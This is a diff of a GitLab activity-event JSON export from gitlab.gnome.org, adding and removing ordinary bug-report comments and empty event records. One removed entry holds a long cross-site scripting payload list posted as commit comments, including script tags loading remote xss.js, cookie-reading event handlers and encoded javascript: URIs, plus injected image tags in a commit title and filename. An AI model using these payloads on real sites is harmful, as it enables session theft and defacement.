@@ -548,6 +548,47 @@
         },
         "author_username": "pberetta65",
         "user_id": 28508
+      },
+      {
+        "project_id": 1848,
+        "action_name": "commented on",
+        "target_id": 677079,
+        "target_iid": 677079,
+        "target_type": "Note",
+        "author_id": 28508,
+        "target_title": "GIMP crashes on startup",
+        "created_at": "2020-01-04T18:03:00.735Z",
+        "note": {
+          "id": 677079,
+          "type": null,
+          "body": "I haven't libreoffice installed, nor I installed any new font that could have triggered the crash. I may try to perform a clean reinstall of GIMP: is there any further cleanup action to take, other that the simple uninstallation ?",
+          "attachment": null,
+          "author": {
+            "id": 28508,
+            "name": "Paolo Beretta",
+            "username": "pberetta65",
+            "state": "active",
+            "avatar_url": "https://secure.gravatar.com/avatar/3ccc3f14d22f65f32c2b09872270132c?s=80&d=identicon",
+            "web_url": "https://gitlab.gnome.org/pberetta65"
+          },
+          "created_at": "2020-01-04T18:03:00.007Z",
+          "updated_at": "2020-01-04T18:03:11.881Z",
+          "system": false,
+          "noteable_id": 76964,
+          "noteable_type": "Issue",
+          "resolvable": false,
+          "noteable_iid": 4364
+        },
+        "author": {
+          "id": 28508,
+          "name": "Paolo Beretta",
+          "username": "pberetta65",
+          "state": "active",
+          "avatar_url": "https://secure.gravatar.com/avatar/3ccc3f14d22f65f32c2b09872270132c?s=80&d=identicon",
+          "web_url": "https://gitlab.gnome.org/pberetta65"
+        },
+        "author_username": "pberetta65",
+        "user_id": 28508
       }
     ]
   },
@@ -7549,10 +7590,6 @@
     "events": []
   },
   {
-    "id": 28714,
-    "events": []
-  },
-  {
     "id": 28715,
     "events": []
   },
@@ -7885,10 +7922,6 @@
     "events": []
   },
   {
-    "id": 28722,
-    "events": []
-  },
-  {
     "id": 28723,
     "events": [
       {
@@ -8001,6 +8034,26 @@
           "resolvable": false,
           "noteable_iid": 710
         },
+        "author": {
+          "id": 28728,
+          "name": "Rafostar",
+          "username": "Rafostar",
+          "state": "active",
+          "avatar_url": "https://gitlab.gnome.org/uploads/-/system/user/avatar/28728/avatar.png",
+          "web_url": "https://gitlab.gnome.org/Rafostar"
+        },
+        "author_username": "Rafostar",
+        "user_id": 28728
+      },
+      {
+        "project_id": 106,
+        "action_name": "opened",
+        "target_id": 77777,
+        "target_iid": 297,
+        "target_type": "Issue",
+        "author_id": 28728,
+        "target_title": "Using GFileMonitor crashes GNOME Shell with toggling down object error",
+        "created_at": "2020-01-04T21:32:39.715Z",
         "author": {
           "id": 28728,
           "name": "Rafostar",
@@ -9564,18 +9617,6 @@
     ]
   },
   {
-    "id": 28773,
-    "events": []
-  },
-  {
-    "id": 28774,
-    "events": []
-  },
-  {
-    "id": 28775,
-    "events": []
-  },
-  {
     "id": 28776,
     "events": [
       {
@@ -9601,14 +9642,6 @@
     ]
   },
   {
-    "id": 28777,
-    "events": []
-  },
-  {
-    "id": 28778,
-    "events": []
-  },
-  {
     "id": 28779,
     "events": []
   },
@@ -9618,10 +9651,6 @@
   },
   {
     "id": 28781,
-    "events": []
-  },
-  {
-    "id": 28782,
     "events": []
   },
   {
@@ -9648,10 +9677,6 @@
         "user_id": 28783
       }
     ]
-  },
-  {
-    "id": 28784,
-    "events": []
   },
   {
     "id": 28785,
@@ -9768,10 +9793,6 @@
         "user_id": 28787
       }
     ]
-  },
-  {
-    "id": 28788,
-    "events": []
   },
   {
     "id": 28789,
@@ -9928,14 +9949,6 @@
     ]
   },
   {
-    "id": 28796,
-    "events": []
-  },
-  {
-    "id": 28797,
-    "events": []
-  },
-  {
     "id": 28798,
     "events": []
   },
@@ -9988,14 +10001,6 @@
         "user_id": 28800
       }
     ]
-  },
-  {
-    "id": 28801,
-    "events": []
-  },
-  {
-    "id": 28802,
-    "events": []
   },
   {
     "id": 28803,
@@ -10250,10 +10255,6 @@
     "events": []
   },
   {
-    "id": 28809,
-    "events": []
-  },
-  {
     "id": 28810,
     "events": [
       {
@@ -10422,10 +10423,6 @@
     ]
   },
   {
-    "id": 28811,
-    "events": []
-  },
-  {
     "id": 28812,
     "events": []
   },
@@ -10558,18 +10555,6 @@
     ]
   },
   {
-    "id": 28814,
-    "events": []
-  },
-  {
-    "id": 28815,
-    "events": []
-  },
-  {
-    "id": 28816,
-    "events": []
-  },
-  {
     "id": 28817,
     "events": [
       {
@@ -10686,14 +10671,6 @@
     ]
   },
   {
-    "id": 28818,
-    "events": []
-  },
-  {
-    "id": 28819,
-    "events": []
-  },
-  {
     "id": 28820,
     "events": [
       {
@@ -10717,10 +10694,6 @@
         "user_id": 28820
       }
     ]
-  },
-  {
-    "id": 28821,
-    "events": []
   },
   {
     "id": 28822,
@@ -10814,10 +10787,6 @@
   },
   {
     "id": 28824,
-    "events": []
-  },
-  {
-    "id": 28825,
     "events": []
   },
   {
@@ -10921,10 +10890,6 @@
     ]
   },
   {
-    "id": 28830,
-    "events": []
-  },
-  {
     "id": 28831,
     "events": [
       {
@@ -11008,10 +10973,6 @@
     "events": []
   },
   {
-    "id": 28836,
-    "events": []
-  },
-  {
     "id": 28837,
     "events": [
       {
@@ -11076,14 +11037,6 @@
         "user_id": 28837
       }
     ]
-  },
-  {
-    "id": 28838,
-    "events": []
-  },
-  {
-    "id": 28839,
-    "events": []
   },
   {
     "id": 28840,
@@ -11165,14 +11118,6 @@
     ]
   },
   {
-    "id": 28842,
-    "events": []
-  },
-  {
-    "id": 28843,
-    "events": []
-  },
-  {
     "id": 28844,
     "events": [
       {
@@ -11223,23 +11168,7 @@
     "events": []
   },
   {
-    "id": 28846,
-    "events": []
-  },
-  {
-    "id": 28847,
-    "events": []
-  },
-  {
-    "id": 28848,
-    "events": []
-  },
-  {
     "id": 28849,
-    "events": []
-  },
-  {
-    "id": 28850,
     "events": []
   },
   {
@@ -11982,6 +11911,47 @@
         },
         "author_username": "bogdan-scc",
         "user_id": 28861
+      },
+      {
+        "project_id": 3536,
+        "action_name": "commented on",
+        "target_id": 676999,
+        "target_iid": 676999,
+        "target_type": "Note",
+        "author_id": 28861,
+        "target_title": "[WIA] session.end_of_feed() unexpected behaviour",
+        "created_at": "2020-01-04T14:30:28.691Z",
+        "note": {
+          "id": 676999,
+          "type": null,
+          "body": "Will do it. I'll come back with results on Monday. Currently, I can't access that scanner.",
+          "attachment": null,
+          "author": {
+            "id": 28861,
+            "name": "bogdan-scc",
+            "username": "bogdan-scc",
+            "state": "active",
+            "avatar_url": "https://secure.gravatar.com/avatar/7493c576d7ee5b85130bf8afeb42dda8?s=80&d=identicon",
+            "web_url": "https://gitlab.gnome.org/bogdan-scc"
+          },
+          "created_at": "2020-01-04T14:30:23.229Z",
+          "updated_at": "2020-01-04T14:30:23.229Z",
+          "system": false,
+          "noteable_id": 77503,
+          "noteable_type": "Issue",
+          "resolvable": false,
+          "noteable_iid": 58
+        },
+        "author": {
+          "id": 28861,
+          "name": "bogdan-scc",
+          "username": "bogdan-scc",
+          "state": "active",
+          "avatar_url": "https://secure.gravatar.com/avatar/7493c576d7ee5b85130bf8afeb42dda8?s=80&d=identicon",
+          "web_url": "https://gitlab.gnome.org/bogdan-scc"
+        },
+        "author_username": "bogdan-scc",
+        "user_id": 28861
       }
     ]
   },
@@ -12435,10 +12405,6 @@
     ]
   },
   {
-    "id": 28867,
-    "events": []
-  },
-  {
     "id": 28868,
     "events": [
       {
@@ -12489,10 +12455,6 @@
     ]
   },
   {
-    "id": 28870,
-    "events": []
-  },
-  {
     "id": 28871,
     "events": [
       {
@@ -12537,10 +12499,6 @@
         "user_id": 28871
       }
     ]
-  },
-  {
-    "id": 28872,
-    "events": []
   },
   {
     "id": 28873,
@@ -12648,10 +12606,6 @@
         "user_id": 28873
       }
     ]
-  },
-  {
-    "id": 28874,
-    "events": []
   },
   {
     "id": 28875,
@@ -12911,10 +12865,6 @@
     "events": []
   },
   {
-    "id": 28880,
-    "events": []
-  },
-  {
     "id": 28881,
     "events": [
       {
@@ -12979,14 +12929,6 @@
         "user_id": 28881
       }
     ]
-  },
-  {
-    "id": 28882,
-    "events": []
-  },
-  {
-    "id": 28883,
-    "events": []
   },
   {
     "id": 28884,
@@ -13068,19 +13010,7 @@
     ]
   },
   {
-    "id": 28888,
-    "events": []
-  },
-  {
     "id": 28889,
-    "events": []
-  },
-  {
-    "id": 28890,
-    "events": []
-  },
-  {
-    "id": 28891,
     "events": []
   },
   {
@@ -13137,10 +13067,6 @@
         "user_id": 28892
       }
     ]
-  },
-  {
-    "id": 28893,
-    "events": []
   },
   {
     "id": 28894,
@@ -13385,10 +13311,6 @@
     "events": []
   },
   {
-    "id": 28898,
-    "events": []
-  },
-  {
     "id": 28899,
     "events": [
       {
@@ -13507,10 +13429,6 @@
         "user_id": 28902
       }
     ]
-  },
-  {
-    "id": 28903,
-    "events": []
   },
   {
     "id": 28904,
@@ -13680,10 +13598,6 @@
         "user_id": 28904
       }
     ]
-  },
-  {
-    "id": 28905,
-    "events": []
   },
   {
     "id": 28906,
@@ -13991,10 +13905,6 @@
     "events": []
   },
   {
-    "id": 28910,
-    "events": []
-  },
-  {
     "id": 28911,
     "events": [
       {
@@ -14016,16 +13926,90 @@
         },
         "author_username": "thinkingtorus",
         "user_id": 28911
+      },
+      {
+        "project_id": 1,
+        "action_name": "commented on",
+        "target_id": 677014,
+        "target_iid": 677014,
+        "target_type": "DiscussionNote",
+        "author_id": 28911,
+        "target_title": "Gnome on Ubuntu 18.04.2 LTS text copying triggers apparently useless file writes",
+        "created_at": "2020-01-04T15:06:44.400Z",
+        "note": {
+          "id": 677014,
+          "type": "DiscussionNote",
+          "body": "So the bug cannot be reproduced in 3.34.x?",
+          "attachment": null,
+          "author": {
+            "id": 28911,
+            "name": "Thinking Torus",
+            "username": "thinkingtorus",
+            "state": "active",
+            "avatar_url": "https://secure.gravatar.com/avatar/9304425f94d8933e40b93dd19a881a66?s=80&d=identicon",
+            "web_url": "https://gitlab.gnome.org/thinkingtorus"
+          },
+          "created_at": "2020-01-04T15:06:43.524Z",
+          "updated_at": "2020-01-04T15:06:43.524Z",
+          "system": false,
+          "noteable_id": 77371,
+          "noteable_type": "Issue",
+          "resolvable": false,
+          "noteable_iid": 1323
+        },
+        "author": {
+          "id": 28911,
+          "name": "Thinking Torus",
+          "username": "thinkingtorus",
+          "state": "active",
+          "avatar_url": "https://secure.gravatar.com/avatar/9304425f94d8933e40b93dd19a881a66?s=80&d=identicon",
+          "web_url": "https://gitlab.gnome.org/thinkingtorus"
+        },
+        "author_username": "thinkingtorus",
+        "user_id": 28911
+      },
+      {
+        "project_id": 1,
+        "action_name": "commented on",
+        "target_id": 677075,
+        "target_iid": 677075,
+        "target_type": "DiscussionNote",
+        "author_id": 28911,
+        "target_title": "Gnome on Ubuntu 18.04.2 LTS text copying triggers apparently useless file writes",
+        "created_at": "2020-01-04T17:53:40.585Z",
+        "note": {
+          "id": 677075,
+          "type": "DiscussionNote",
+          "body": "My bad. I assumed it would take someone just a few seconds to check to see if the bug is reproducible (I believe copying some text and then checking a file's timestamp is pretty quick and simple). Thanks for pointing out that the bug is no longer relevant.\n\nAs to the question of \"why\", if I may:\nUbuntu is Google Trend's most popular Linux distro by a huge margin, and 18.04 is its latest LTS release. So ancient as it is, the GNOME shipped with Ubuntu still has a lot of users. For example, here is another issue:\n#1327",
+          "attachment": null,
+          "author": {
+            "id": 28911,
+            "name": "Thinking Torus",
+            "username": "thinkingtorus",
+            "state": "active",
+            "avatar_url": "https://secure.gravatar.com/avatar/9304425f94d8933e40b93dd19a881a66?s=80&d=identicon",
+            "web_url": "https://gitlab.gnome.org/thinkingtorus"
+          },
+          "created_at": "2020-01-04T17:53:39.843Z",
+          "updated_at": "2020-01-04T17:53:39.843Z",
+          "system": false,
+          "noteable_id": 77371,
+          "noteable_type": "Issue",
+          "resolvable": false,
+          "noteable_iid": 1323
+        },
+        "author": {
+          "id": 28911,
+          "name": "Thinking Torus",
+          "username": "thinkingtorus",
+          "state": "active",
+          "avatar_url": "https://secure.gravatar.com/avatar/9304425f94d8933e40b93dd19a881a66?s=80&d=identicon",
+          "web_url": "https://gitlab.gnome.org/thinkingtorus"
+        },
+        "author_username": "thinkingtorus",
+        "user_id": 28911
       }
     ]
-  },
-  {
-    "id": 28912,
-    "events": []
-  },
-  {
-    "id": 28913,
-    "events": []
   },
   {
     "id": 28914,
@@ -14204,315 +14188,6 @@
     ]
   },
   {
-    "id": 28917,
-    "events": [
-      {
-        "project_id": 9689,
-        "action_name": "created",
-        "target_id": null,
-        "target_iid": null,
-        "target_type": null,
-        "author_id": 28917,
-        "target_title": null,
-        "created_at": "2019-12-26T08:54:19.539Z",
-        "author": {
-          "id": 28917,
-          "name": "MR FRamar0#t",
-          "username": "firmansyahfikri836",
-          "state": "active",
-          "avatar_url": "https://secure.gravatar.com/avatar/df70fd8e443ec8084ef1755c95d79983?s=80&d=identicon",
-          "web_url": "https://gitlab.gnome.org/firmansyahfikri836"
-        },
-        "author_username": "firmansyahfikri836",
-        "user_id": 28917
-      },
-      {
-        "project_id": 9689,
-        "action_name": "pushed new",
-        "target_id": null,
-        "target_iid": null,
-        "target_type": null,
-        "author_id": 28917,
-        "target_title": null,
-        "created_at": "2019-12-26T08:54:24.785Z",
-        "author": {
-          "id": 28917,
-          "name": "MR FRamar0#t",
-          "username": "firmansyahfikri836",
-          "state": "active",
-          "avatar_url": "https://secure.gravatar.com/avatar/df70fd8e443ec8084ef1755c95d79983?s=80&d=identicon",
-          "web_url": "https://gitlab.gnome.org/firmansyahfikri836"
-        },
-        "push_data": {
-          "commit_count": 1,
-          "action": "created",
-          "ref_type": "branch",
-          "commit_from": null,
-          "commit_to": "4db4435511592e2be191b67323d7a5f3c0e4dc4a",
-          "ref": "master",
-          "commit_title": "Initial commit",
-          "ref_count": null
-        },
-        "author_username": "firmansyahfikri836",
-        "user_id": 28917
-      },
-      {
-        "project_id": 9689,
-        "action_name": "commented on",
-        "target_id": 673893,
-        "target_iid": 673893,
-        "target_type": "Note",
-        "author_id": 28917,
-        "target_title": "Initial commit",
-        "created_at": "2019-12-26T08:56:40.338Z",
-        "note": {
-          "id": 673893,
-          "type": null,
-          "body": "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\n<IMG SRC=# onmouseover=\"alert('xxs')\">\n<IMG SRC= onmouseover=\"alert('xxs')\">\n<IMG onmouseover=\"alert('xxs')\">",
-          "attachment": null,
-          "author": {
-            "id": 28917,
-            "name": "MR FRamar0#t",
-            "username": "firmansyahfikri836",
-            "state": "active",
-            "avatar_url": "https://secure.gravatar.com/avatar/df70fd8e443ec8084ef1755c95d79983?s=80&d=identicon",
-            "web_url": "https://gitlab.gnome.org/firmansyahfikri836"
-          },
-          "created_at": "2019-12-26T08:56:40.111Z",
-          "updated_at": "2019-12-26T08:56:40.111Z",
-          "system": false,
-          "noteable_id": null,
-          "noteable_type": "Commit",
-          "resolvable": false,
-          "noteable_iid": null
-        },
-        "author": {
-          "id": 28917,
-          "name": "MR FRamar0#t",
-          "username": "firmansyahfikri836",
-          "state": "active",
-          "avatar_url": "https://secure.gravatar.com/avatar/df70fd8e443ec8084ef1755c95d79983?s=80&d=identicon",
-          "web_url": "https://gitlab.gnome.org/firmansyahfikri836"
-        },
-        "author_username": "firmansyahfikri836",
-        "user_id": 28917
-      },
-      {
-        "project_id": 9689,
-        "action_name": "commented on",
-        "target_id": 673894,
-        "target_iid": 673894,
-        "target_type": "Note",
-        "author_id": 28917,
-        "target_title": "Initial commit",
-        "created_at": "2019-12-26T08:57:08.205Z",
-        "note": {
-          "id": 673894,
-          "type": null,
-          "body": "'';!--\"<XSS>=&{()}\r\n0\\\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>\"-confirm(3)-\"\r\n<script/src=data:,alert()>\r\n<marquee/onstart=alert()>\r\n<video/poster/onerror=alert()>\r\n<isindex/autofocus/onfocus=alert()>\r\n<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>\r\n<IMG SRC=\"javascript:alert('XSS');\">\r\n<IMG SRC=javascript:alert('XSS')>\r\n<IMG SRC=JaVaScRiPt:alert('XSS')>\r\n<IMG SRC=javascript:alert(\"XSS\")>\r\n<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>\r\n<a onmouseover=\"alert(document.cookie)\">xxs link</a>\r\n<a onmouseover=alert(document.cookie)>xxs link</a>\r\n<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">\r\n<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\r\n<IMG SRC=# onmouseover=\"alert('xxs')\">\r\n<IMG SRC= onmouseover=\"alert('xxs')\">\r\n<IMG onmouseover=\"alert('xxs')\">[](url)",
-          "attachment": null,
-          "author": {
-            "id": 28917,
-            "name": "MR FRamar0#t",
-            "username": "firmansyahfikri836",
-            "state": "active",
-            "avatar_url": "https://secure.gravatar.com/avatar/df70fd8e443ec8084ef1755c95d79983?s=80&d=identicon",
-            "web_url": "https://gitlab.gnome.org/firmansyahfikri836"
-          },
-          "created_at": "2019-12-26T08:57:07.982Z",
-          "updated_at": "2019-12-26T08:57:55.139Z",
-          "system": false,
-          "noteable_id": null,
-          "noteable_type": "Commit",
-          "resolvable": false,
-          "noteable_iid": null
-        },
-        "author": {
-          "id": 28917,
-          "name": "MR FRamar0#t",
-          "username": "firmansyahfikri836",
-          "state": "active",
-          "avatar_url": "https://secure.gravatar.com/avatar/df70fd8e443ec8084ef1755c95d79983?s=80&d=identicon",
-          "web_url": "https://gitlab.gnome.org/firmansyahfikri836"
-        },
-        "author_username": "firmansyahfikri836",
-        "user_id": 28917
-      },
-      {
-        "project_id": 9689,
-        "action_name": "commented on",
-        "target_id": 673895,
-        "target_iid": 673895,
-        "target_type": "Note",
-        "author_id": 28917,
-        "target_title": "Initial commit",
-        "created_at": "2019-12-26T08:58:23.828Z",
-        "note": {
-          "id": 673895,
-          "type": null,
-          "body": "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>\n'';!--\"<XSS>=&{()}\n0\\\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>\"-confirm(3)-\"\n<script/src=data:,alert()>\n<marquee/onstart=alert()>\n<video/poster/onerror=alert()>\n<isindex/autofocus/onfocus=alert()>\n<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>\n<IMG SRC=\"javascript:alert('XSS');\">\n<IMG SRC=javascript:alert('XSS')>\n<IMG SRC=JaVaScRiPt:alert('XSS')>\n<IMG SRC=javascript:alert(\"XSS\")>\n<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>\n<a onmouseover=\"alert(document.cookie)\">xxs link</a>\n<a onmouseover=alert(document.cookie)>xxs link</a>\n<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">\n<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\n<IMG SRC=# onmouseover=\"alert('xxs')\">\n<IMG SRC= onmouseover=\"alert('xxs')\">\n<IMG onmouseover=\"alert('xxs')\">\n<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>\n<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;\n&#39;&#88;&#83;&#83;&#39;&#41;>\n<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&\n#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>\n<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\n<IMG SRC=\"jav\tascript:alert('XSS');\">\n<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">\n<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">\n<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">\n<IMG SRC=\" &#14;  javascript:alert('XSS');\">\n<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>\n<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<<SCRIPT>alert(\"XSS\");//<</SCRIPT>\n<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >\n<SCRIPT SRC=//ha.ckers.org/.j>\n<IMG SRC=\"javascript:alert('XSS')\"\n<iframe src=http://ha.ckers.org/scriptlet.html <\n\\\";alert('XSS');//\n</script><script>alert('XSS');</script>\n</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>\n<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">\n<BODY BACKGROUND=\"javascript:alert('XSS')\">\n<IMG DYNSRC=\"javascript:alert('XSS')\">\n<IMG LOWSRC=\"javascript:alert('XSS')\">\n<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>\n<IMG SRC='vbscript:msgbox(\"XSS\")'>\n<IMG SRC=\"livescript:[code]\">\n<BODY ONLOAD=alert('XSS')>\n<BGSOUND SRC=\"javascript:alert('XSS');\">\n<BR SIZE=\"&{alert('XSS')}\">\n<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">\n<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">\n<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>\n<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">\n<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>\n<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>\n<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">\nexp/*<A STYLE='no\\xss:noxss(\"*//*\");\nxss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>\n<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>\n<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>\n<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>\n<XSS STYLE=\"xss:expression(alert('XSS'))\">\n<XSS STYLE=\"behavior: url(xss.htc);\">\n\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be\n<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">\n<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\n<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">\n<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>\n<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>\n<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>\n<TABLE BACKGROUND=\"javascript:alert('XSS')\">\n<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">\n<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">\n<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">\n<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">\n<DIV STYLE=\"width: expression(alert('XSS'));\">\n<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->\n<BASE HREF=\"javascript:alert('XSS');//\">\n<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>\n<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'\"-->\n<? echo('<SCR)';echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>\n<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">\n<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">\n<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\n<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<SCRIPT =\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<A HREF=\"http://66.102.7.147/\">XSS</A>\n0\\\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>\"-confirm(3)-\"\nveris-->group<svg/onload=alert(/XSS/)//\n#\"><img src=M onerror=alert('XSS');>\nelement[attribute='<img src=x onerror=alert('XSS');>\n[<blockquote cite=\"]\">[\" onmouseover=\"alert('RVRSH3LL_XSS');\" ]\n%22;alert%28%27RVRSH3LL_XSS%29//\njavascript:alert%281%29;\n<w contenteditable id=x onfocus=alert()>\nalert;pg(\"XSS\")\n<svg/onload=%26%23097lert%26lpar;1337)>\n<script>for((i)in(self))eval(i)(1)</script>\n<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>\n<sCR<script>iPt>alert(1)</SCr</script>IPt>\n<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\">test</a>",
-          "attachment": null,
-          "author": {
-            "id": 28917,
-            "name": "MR FRamar0#t",
-            "username": "firmansyahfikri836",
-            "state": "active",
-            "avatar_url": "https://secure.gravatar.com/avatar/df70fd8e443ec8084ef1755c95d79983?s=80&d=identicon",
-            "web_url": "https://gitlab.gnome.org/firmansyahfikri836"
-          },
-          "created_at": "2019-12-26T08:58:23.354Z",
-          "updated_at": "2019-12-26T08:58:23.354Z",
-          "system": false,
-          "noteable_id": null,
-          "noteable_type": "Commit",
-          "resolvable": false,
-          "noteable_iid": null
-        },
-        "author": {
-          "id": 28917,
-          "name": "MR FRamar0#t",
-          "username": "firmansyahfikri836",
-          "state": "active",
-          "avatar_url": "https://secure.gravatar.com/avatar/df70fd8e443ec8084ef1755c95d79983?s=80&d=identicon",
-          "web_url": "https://gitlab.gnome.org/firmansyahfikri836"
-        },
-        "author_username": "firmansyahfikri836",
-        "user_id": 28917
-      },
-      {
-        "project_id": 9689,
-        "action_name": "commented on",
-        "target_id": 673896,
-        "target_iid": 673896,
-        "target_type": "Note",
-        "author_id": 28917,
-        "target_title": "Initial commit",
-        "created_at": "2019-12-26T09:01:23.837Z",
-        "note": {
-          "id": 673896,
-          "type": null,
-          "body": "![IMG20191023090658](/uploads/23738eab444052dbe46ab7a4473a85d8/\"><img src=x onerror=alert()>.jpg)",
-          "attachment": null,
-          "author": {
-            "id": 28917,
-            "name": "MR FRamar0#t",
-            "username": "firmansyahfikri836",
-            "state": "active",
-            "avatar_url": "https://secure.gravatar.com/avatar/df70fd8e443ec8084ef1755c95d79983?s=80&d=identicon",
-            "web_url": "https://gitlab.gnome.org/firmansyahfikri836"
-          },
-          "created_at": "2019-12-26T09:01:23.576Z",
-          "updated_at": "2019-12-26T09:01:23.576Z",
-          "system": false,
-          "noteable_id": null,
-          "noteable_type": "Commit",
-          "resolvable": false,
-          "noteable_iid": null
-        },
-        "author": {
-          "id": 28917,
-          "name": "MR FRamar0#t",
-          "username": "firmansyahfikri836",
-          "state": "active",
-          "avatar_url": "https://secure.gravatar.com/avatar/df70fd8e443ec8084ef1755c95d79983?s=80&d=identicon",
-          "web_url": "https://gitlab.gnome.org/firmansyahfikri836"
-        },
-        "author_username": "firmansyahfikri836",
-        "user_id": 28917
-      },
-      {
-        "project_id": 9689,
-        "action_name": "pushed new",
-        "target_id": null,
-        "target_iid": null,
-        "target_type": null,
-        "author_id": 28917,
-        "target_title": null,
-        "created_at": "2019-12-26T09:22:06.560Z",
-        "author": {
-          "id": 28917,
-          "name": "MR FRamar0#t",
-          "username": "firmansyahfikri836",
-          "state": "active",
-          "avatar_url": "https://secure.gravatar.com/avatar/df70fd8e443ec8084ef1755c95d79983?s=80&d=identicon",
-          "web_url": "https://gitlab.gnome.org/firmansyahfikri836"
-        },
-        "push_data": {
-          "commit_count": 1,
-          "action": "created",
-          "ref_type": "branch",
-          "commit_from": null,
-          "commit_to": "80cdd83e17dc52858d838d4148d22c53e36bbda6",
-          "ref": "test",
-          "commit_title": "\"><img src=x onerror=alert()>",
-          "ref_count": null
-        },
-        "author_username": "firmansyahfikri836",
-        "user_id": 28917
-      },
-      {
-        "project_id": 9689,
-        "action_name": "opened",
-        "target_id": 700,
-        "target_iid": 1,
-        "target_type": "Milestone",
-        "author_id": 28917,
-        "target_title": "test123",
-        "created_at": "2019-12-26T09:23:36.020Z",
-        "author": {
-          "id": 28917,
